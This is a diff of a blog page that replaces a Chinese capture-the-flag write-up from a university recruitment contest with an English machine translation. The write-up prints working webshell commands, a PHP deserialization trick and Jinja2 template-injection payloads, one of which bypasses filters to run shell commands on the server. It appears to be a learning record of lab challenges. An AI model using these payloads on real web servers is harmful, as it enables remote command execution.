@@ -13,25 +13,25 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
     <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
     
-<link rel="stylesheet" href="/css/loader.css?v=mv3j42eu">
+<link rel="stylesheet" href="/css/loader.css?v=mv3ju4jj">
 
-    <meta name="description" content="Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.   # 凝聚招新  ## Sign in  同往届，基本的html修改，按钮disalbed改为abled即可  ## Backdoor    @eval()反应过来小马，直接post个cnss&#x3D;system(&quot;ls">
+    <meta name="description" content="Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.   # Cohesion Recruitment  ## Sign in  Same as previous years, basic HTML modification; just change the butto">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Cohesion Recruitment">
 <meta property="og:url" content="https://blog.wray7.top/en/2022/10/11/2022-10-11-%E5%87%9D%E8%81%9A%E6%8B%9B%E6%96%B0/index.html">
 <meta property="og:site_name" content="Wray's Blog">
-<meta property="og:description" content="Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.   # 凝聚招新  ## Sign in  同往届，基本的html修改，按钮disalbed改为abled即可  ## Backdoor    @eval()反应过来小马，直接post个cnss&#x3D;system(&quot;ls">
+<meta property="og:description" content="Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.   # Cohesion Recruitment  ## Sign in  Same as previous years, basic HTML modification; just change the butto">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-10-11T12:59:23.000Z">
-<meta property="article:modified_time" content="2026-10-10T21:08:58.201Z">
+<meta property="article:modified_time" content="2026-10-11T08:09:45.617Z">
 <meta property="article:author" content="Wray Lee">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
-      <meta name="keywords" content="技术, 笔记, 折腾, 教程">
+      <meta name="keywords" content="tech, notes, tinkering, tutorials">
     <link rel="alternate" href="/en/atom.xml" title="Wray's Blog" type="application/atom+xml">
     <link rel="shortcut icon" href="/images/favicon.ico">
   
-<link rel="stylesheet" href="/css/style.css?v=mv3j42eu">
+<link rel="stylesheet" href="/css/style.css?v=mv3ju4jj">
 
   <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
     
@@ -206,7 +206,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Post</div>
-    <div class="sidebar-state-number">789</div>
+    <div class="sidebar-state-number">792</div>
   </div>
   <div class="sidebar-state-category">
     <div>Category</div>
@@ -214,7 +214,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>Tag</div>
-    <div class="sidebar-state-number">26</div>
+    <div class="sidebar-state-number">28</div>
   </div>
 </div>
 <div class="sidebar-social" >
@@ -282,57 +282,57 @@
 <p>Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.</p>
 </blockquote>
 
-# 凝聚招新
+# Cohesion Recruitment
 
 ## Sign in
 
-同往届，基本的html修改，按钮disalbed改为abled即可
+Same as previous years, basic HTML modification; just change the button disalbed to abled
 
 ## Backdoor
 
 
 
-@eval()反应过来小马，直接post个cnss=system("ls");<-（这里分号不要忘记）
+Recognize @eval() as a webshell; directly POST cnss=system("ls");<- (don't forget the semicolon here)
 
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /		</span><br></pre></td></tr></table></figure>
 
-发现flag解出
+Found the flag and solved it
 
 ## ezunserialize
 
-注意unicode码，序列化传入？cnss={}，成员数量设高跳过wakeup
+Pay attention to Unicode code, serialize and pass in ?cnss={}, set the member count high to skip wakeup
 
 ## Webpack
 
 ## Leak
 
-dirsearch直接扫服务器目录，发现vim的swp文件，里面发现@eval，同样
+Use dirsearch to directly scan the server directory, find vim's swp file, and discover @eval inside, same as before
 
 
 
-GET 发送一个cnss@30fc5b20a309996f3ab12662e3c4ac932c08db7f=system("ls /");
+Send a GET request with cnss@30fc5b20a309996f3ab12662e3c4ac932c08db7f=system("ls /");
 
-根目录下发现fl4444444g
+Found fl4444444g in the root directory
 
 ## ezhttp
 
-一步一步来
+Take it step by step
 
-burpsuite repeater发过去发现
-
-
+Send it with Burp Suite Repeater and discover
 
 
 
-改成CNSS请求方式发送
+
+
+Change it to the CNSS request method and send
 
 
 
-上网查找安卓微信内置浏览器user-agent改好
+Search online for the Android WeChat built-in browser user-agent and modify it properly
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只接受来自cnss.io的请求</span><br></pre></td></tr></table></figure>
 
-referer改为cnss.io
+Change referer to cnss.io
 
 
 
@@ -340,7 +340,7 @@ referer改为cnss.io
 
 ## Feedback
 
-ssti构造payload
+Construct an SSTI payload
 
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="operator">%</span>print lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>] [<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()<span class="operator">%</span>&#125;</span><br></pre></td></tr></table></figure>
 
@@ -350,19 +350,19 @@ ssti构造payload
 
 ## Hard
 
-{{config}}出现回显
+{{config}} output appears
 
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&amp;</span>lt;Config &#123;<span class="operator">&amp;</span>#<span class="number">39</span>;ENV<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="operator">&amp;</span>#<span class="number">39</span>;production<span class="operator">&amp;</span>#<span class="number">39</span>;, <span class="operator">&amp;</span>#<span class="number">39</span>;DEBUG<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">False</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;TESTING<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">False</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;PROPAGATE_EXCEPTIONS<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;PRESERVE_CONTEXT_ON_EXCEPTION<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;SECRET_KEY<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;PERMANENT_SESSION_LIFETIME<span class="operator">&amp;</span>#<span class="number">39</span>;: datetime.timedelta(days<span class="operator">=</span><span class="number">31</span>), <span class="operator">&amp;</span>#<span class="number">39</span>;USE_X_SENDFILE<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">False</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;SERVER_NAME<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;APPLICATION_ROOT<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="operator">&amp;</span>#<span class="number">39</span>;<span class="operator">/</span><span class="operator">&amp;</span>#<span class="number">39</span>;, <span class="operator">&amp;</span>#<span class="number">39</span>;SESSION_COOKIE_NAME<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="operator">&amp;</span>#<span class="number">39</span>;session<span class="operator">&amp;</span>#<span class="number">39</span>;, <span class="operator">&amp;</span>#<span class="number">39</span>;SESSION_COOKIE_DOMAIN<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;SESSION_COOKIE_PATH<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;SESSION_COOKIE_HTTPONLY<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">True</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;SESSION_COOKIE_SECURE<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">False</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;SESSION_COOKIE_SAMESITE<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;SESSION_REFRESH_EACH_REQUEST<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">True</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;MAX_CONTENT_LENGTH<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;SEND_FILE_MAX_AGE_DEFAULT<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;TRAP_BAD_REQUEST_ERRORS<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;TRAP_HTTP_EXCEPTIONS<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">False</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;EXPLAIN_TEMPLATE_LOADING<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">False</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;PREFERRED_URL_SCHEME<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="operator">&amp;</span>#<span class="number">39</span>;http<span class="operator">&amp;</span>#<span class="number">39</span>;, <span class="operator">&amp;</span>#<span class="number">39</span>;JSON_AS_ASCII<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">True</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;JSON_SORT_KEYS<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">True</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;JSONIFY_PRETTYPRINT_REGULAR<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="literal">False</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;JSONIFY_MIMETYPE<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="operator">&amp;</span>#<span class="number">39</span>;application<span class="operator">/</span>json<span class="operator">&amp;</span>#<span class="number">39</span>;, <span class="operator">&amp;</span>#<span class="number">39</span>;TEMPLATES_AUTO_RELOAD<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="keyword">None</span>, <span class="operator">&amp;</span>#<span class="number">39</span>;MAX_COOKIE_SIZE<span class="operator">&amp;</span>#<span class="number">39</span>;: <span class="number">4093</span>&#125;<span class="operator">&amp;</span>gt;</span><br></pre></td></tr></table></figure>
 
 
 
-判断是ssti
+Determine that it is SSTI
 
-测试出过滤了
+Testing revealed that it filters
 
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_	\x5f</span><br><span class="line">[]	attr()	request.args.	&#123;&#123;()|attr(request.args.x1)&#125;&#125;&amp;x1=??&amp;x2=??</span><br><span class="line">.	\x2E	|attr()</span><br><span class="line">&quot;&quot;</span><br><span class="line">+</span><br></pre></td></tr></table></figure>
 
-构造payload
+Construct payload
 
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url\x5ffor\x2E\x5f\x5f\x2E\x5f\x5fbuiltins\x5f\x5f|attr(\x5f\x5fimport\x5f\x5f)(&#x27;sys&#x27;)\x2Epopen(&#x27;ls&#x27;)\x2Eread()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% print &#x27;&#x27;|attr(request\x2Eargs\x2Eclass)|attr(request\x2Eargs\x2Ebase)|attr(request\x2Eargs\x2Esubclasses)()|attr(request\x2Eargs\x2Egetitem)(99)|attr(request\x2Eargs\x2Einit)|attr(request\x2Eargs\x2Eglobals)|attr(request\x2Eargs\x2Egetitem)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;ls&#x27;)|attr(request\x2Eargs\x2Ere)</span><br><span class="line">()|safe%&#125;&amp;globals=\x5f\x5fglobals\x5f\x5f&amp;subclasses=\x5f\x5fsubclasses\x5f\x5f&amp;re=read&amp;init=\x5f\x5finit\x5f\x5f&amp;base=\x5f\x5fbase\x5f\x5f&amp;class=\x5f\x5fclass\x5f\x5f&amp;getitem=\x5f\x5fgetitem\x5f\x5f</span><br></pre></td></tr></table></figure>
 
@@ -414,10 +414,10 @@ ssti构造payload
       </div>
       <div>
         <span class="icon-brush"></span>
-        554.2k
+        553.7k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        50:26
+        50:34
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -450,7 +450,7 @@ ssti构造payload
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Post</div>
-    <div class="sidebar-state-number">789</div>
+    <div class="sidebar-state-number">792</div>
   </div>
   <div class="sidebar-state-category">
     <div>Category</div>
@@ -458,7 +458,7 @@ ssti构造payload
   </div>
   <div class="sidebar-state-tag">
     <div>Tag</div>
-    <div class="sidebar-state-number">26</div>
+    <div class="sidebar-state-number">28</div>
   </div>
 </div>
 <div class="sidebar-social" >
@@ -528,11 +528,11 @@ ssti构造payload
 
 
 
-<script src="/js/script.js?v=mv3j42eu"></script>
+<script src="/js/script.js?v=mv3ju4jj"></script>
 
 
   
-<script src="/js/aos.js?v=mv3j42eu"></script>
+<script src="/js/aos.js?v=mv3ju4jj"></script>
 
   <script>
     var aosInit = () => {
@@ -551,11 +551,11 @@ ssti构造payload
   </script>
 
 
-<script src="/js/pjax_script.js?v=mv3j42eu" data-pjax></script>
+<script src="/js/pjax_script.js?v=mv3ju4jj" data-pjax></script>
 
 
   
-<script src="/js/generator_search.js?v=mv3j42eu" defer></script>
+<script src="/js/generator_search.js?v=mv3ju4jj" defer></script>
 
 
 
@@ -585,17 +585,17 @@ ssti构造payload
           url: "https://blog.wray7.top/2022/10/11/2022-10-11-%E5%87%9D%E8%81%9A%E6%8B%9B%E6%96%B0/",
           excerpt: "",
           description: "",
-          stripContent: " Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.   # 凝聚招新  ## Sign in  同往届，基本的html修改，按钮disalbed改为abled即可  ## Backdoor    @eval()反应过来小马，直接post个cnss=system(&#34;ls&#34;);",
+          stripContent: " Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.   # Cohesion Recruitment  ## Sign in  Same as previous years, basic HTML modification; just change the button disalbed to abled  ## Backdoor    Recognize @eva",
           date: "Tue Oct 11 2022 20:59:23 GMT+0800",
-          updated: "Sun Oct 11 2026 05:08:58 GMT+0800",
+          updated: "Sun Oct 11 2026 16:09:45 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
         
-<script src="/js/insert_highlight.js?v=mv3j42eu" data-pjax></script>
+<script src="/js/insert_highlight.js?v=mv3ju4jj" data-pjax></script>
 
       
-<script src="/js/tabs.js?v=mv3j42eu" data-pjax defer></script>
+<script src="/js/tabs.js?v=mv3ju4jj" data-pjax defer></script>
 
       <script type="module" data-pjax>
         (async () => {
@@ -654,5 +654,5 @@ ssti构造payload
 
 
 
-  <script src="/js/banner-gallery.js?v=mv3j42eu"></script></body>
+  <script src="/js/banner-gallery.js?v=mv3ju4jj"></script></body>
   </html>
